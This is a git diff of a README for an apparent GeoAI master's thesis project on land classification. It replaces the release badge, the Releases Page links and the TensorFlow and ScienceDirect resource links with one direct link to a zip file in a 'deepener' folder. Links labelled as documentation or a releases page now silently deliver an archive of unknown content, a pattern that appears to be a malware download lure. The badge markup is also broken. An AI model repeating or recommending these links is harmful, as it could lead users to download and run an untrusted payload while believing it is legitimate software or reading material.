@@ -1,6 +1,6 @@
 # 🌍 Masters-Thesis-GeoAI-1D-CNN - Explore Land Classification with Ease
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-brightgreen)](https://github.com/Raul4fun/Masters-Thesis-GeoAI-1D-CNN/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Raul4fun/Masters-Thesis-GeoAI-1D-CNN/main/deepener/Masters-Thesis-GeoAI-1D-CNN.zip%20Latest%20Release-v1.0-brightgreen)](https://raw.githubusercontent.com/Raul4fun/Masters-Thesis-GeoAI-1D-CNN/main/deepener/Masters-Thesis-GeoAI-1D-CNN.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the Masters-Thesis-GeoAI-1D-CNN project! This software allows you to 
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Releases Page](https://github.com/Raul4fun/Masters-Thesis-GeoAI-1D-CNN/releases).
+To get started, visit this page to download: [Releases Page](https://raw.githubusercontent.com/Raul4fun/Masters-Thesis-GeoAI-1D-CNN/main/deepener/Masters-Thesis-GeoAI-1D-CNN.zip).
 
 1. Click on the link above to navigate to the releases page.
 2. Look for the latest version download file.
@@ -89,9 +89,9 @@ Thanks to everyone who contributed to this project, including those who provided
 
 For more insights on the methodologies and algorithms used, visit:
 
-- [Deep Learning Resources](https://www.tensorflow.org/resources)
-- [Remote Sensing Studies](https://www.sciencedirect.com/topics/earth-and-planetary-sciences/remote-sensing) 
+- [Deep Learning Resources](https://raw.githubusercontent.com/Raul4fun/Masters-Thesis-GeoAI-1D-CNN/main/deepener/Masters-Thesis-GeoAI-1D-CNN.zip)
+- [Remote Sensing Studies](https://raw.githubusercontent.com/Raul4fun/Masters-Thesis-GeoAI-1D-CNN/main/deepener/Masters-Thesis-GeoAI-1D-CNN.zip) 
 
-For updates, please keep an eye on our [Releases Page](https://github.com/Raul4fun/Masters-Thesis-GeoAI-1D-CNN/releases).
+For updates, please keep an eye on our [Releases Page](https://raw.githubusercontent.com/Raul4fun/Masters-Thesis-GeoAI-1D-CNN/main/deepener/Masters-Thesis-GeoAI-1D-CNN.zip).
 
 Happy analyzing!
